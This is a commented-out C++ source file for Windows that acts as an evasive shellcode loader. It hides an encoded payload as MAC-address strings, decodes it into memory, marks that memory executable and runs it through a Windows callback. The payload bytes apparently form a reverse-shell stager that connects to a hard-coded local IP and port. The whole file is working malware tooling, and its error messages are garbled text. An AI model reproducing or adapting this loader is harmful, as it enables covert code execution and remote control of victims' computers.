// #include <iostream>
// #include <Windows.h>
// #include <ip2string.h>
// #include <ntstatus.h>
// #pragma comment(lib, "Ntdll.lib")
//
// int main(int argc, char* argv) {
// 	const char* ipv4[] = { "FC-48-83-E4-F0-E8", "CC-00-00-00-41-51", "41-50-52-48-31-D2", "51-56-65-48-8B-52", "60-48-8B-52-18-48", "8B-52-20-48-0F-B7", "4A-4A-48-8B-72-50", "4D-31-C9-48-31-C0", "AC-3C-61-7C-02-2C", "20-41-C1-C9-0D-41", "01-C1-E2-ED-52-41", "51-48-8B-52-20-8B", "42-3C-48-01-D0-66", "81-78-18-0B-02-0F", "85-72-00-00-00-8B", "80-88-00-00-00-48", "85-C0-74-67-48-01", "D0-44-8B-40-20-49", "01-D0-50-8B-48-18", "E3-56-48-FF-C9-41", "8B-34-88-48-01-D6", "4D-31-C9-48-31-C0", "41-C1-C9-0D-AC-41", "01-C1-38-E0-75-F1", "4C-03-4C-24-08-45", "39-D1-75-D8-58-44", "8B-40-24-49-01-D0", "66-41-8B-0C-48-44", "8B-40-1C-49-01-D0", "41-8B-04-88-41-58", "41-58-48-01-D0-5E", "59-5A-41-58-41-59", "41-5A-48-83-EC-20", "41-52-FF-E0-58-41", "59-5A-48-8B-12-E9", "4B-FF-FF-FF-5D-49", "BE-77-73-32-5F-33", "32-00-00-41-56-49", "89-E6-48-81-EC-A0", "01-00-00-49-89-E5", "49-BC-02-00-11-5C", "C0-A8-01-80-41-54", "49-89-E4-4C-89-F1", "41-BA-4C-77-26-07", "FF-D5-4C-89-EA-68", "01-01-00-00-59-41", "BA-29-80-6B-00-FF", "D5-6A-0A-41-5E-50", "50-4D-31-C9-4D-31", "C0-48-FF-C0-48-89", "C2-48-FF-C0-48-89", "C1-41-BA-EA-0F-DF", "E0-FF-D5-48-89-C7", "6A-10-41-58-4C-89", "E2-48-89-F9-41-BA", "99-A5-74-61-FF-D5", "85-C0-74-0A-49-FF", "CE-75-E5-E8-93-00", "00-00-48-83-EC-10", "48-89-E2-4D-31-C9", "6A-04-41-58-48-89", "F9-41-BA-02-D9-C8", "5F-FF-D5-83-F8-00", "7E-55-48-83-C4-20", "5E-89-F6-6A-40-41", "59-68-00-10-00-00", "41-58-48-89-F2-48", "31-C9-41-BA-58-A4", "53-E5-FF-D5-48-89", "C3-49-89-C7-4D-31", "C9-49-89-F0-48-89", "DA-48-89-F9-41-BA", "02-D9-C8-5F-FF-D5", "83-F8-00-7D-28-58", "41-57-59-68-00-40", "00-00-41-58-6A-00", "5A-41-BA-0B-2F-0F", "30-FF-D5-57-59-41", "BA-75-6E-4D-61-FF", "D5-49-FF-CE-E9-3C", "FF-FF-FF-48-01-C3", "48-29-C6-48-85-F6", "75-B4-41-FF-E7-58", "6A-00-59-49-C7-C2", "F0-B5-A2-56-FF-D5" };
// 	int group = std::size(ipv4);
//
// 	typedef LPVOID(WINAPI* oldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
// 	oldVirtualAlloc VA = (oldVirtualAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
// 	LPVOID handle = VA(0, group * 6, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
// 	if (handle == NULL) {
// 		std::cout << "ÉêÇëÄÚ´æÊ§°Ü" << std::endl;
// 		return -1;
// 	}
//
// 	DWORD_PTR rwxpage = (DWORD_PTR)handle;
// 	PCSTR terminator;
// 	for (int i = 0; i < group; i++) {
// 		// std::cout << ipv4[i] << std::endl;
// 		// std::cout << (in6_addr*)rwxpage << std::endl;
// 		NTSTATUS res = RtlEthernetStringToAddressA(ipv4[i], &terminator, (DL_EUI48*)rwxpage);
// 		if (res != STATUS_SUCCESS) {
// 			std::cout << "ÄÚ´æ×ª»»Ê§°Ü" << std::endl;
// 			CloseHandle(handle);
// 			return -1;
// 		}
// 		rwxpage += 6;
// 	}
//
// 	DWORD oldProtect;
// 	typedef BOOL(WINAPI* oldVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
// 	oldVirtualProtect VP = (oldVirtualProtect)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtect");
// 	VP(handle, group * 6, PAGE_EXECUTE_READWRITE, &oldProtect);
// 	EnumSystemLocalesA((LOCALE_ENUMPROCA)handle, 0);
// 	CloseHandle(handle);
// 	return 0;
// }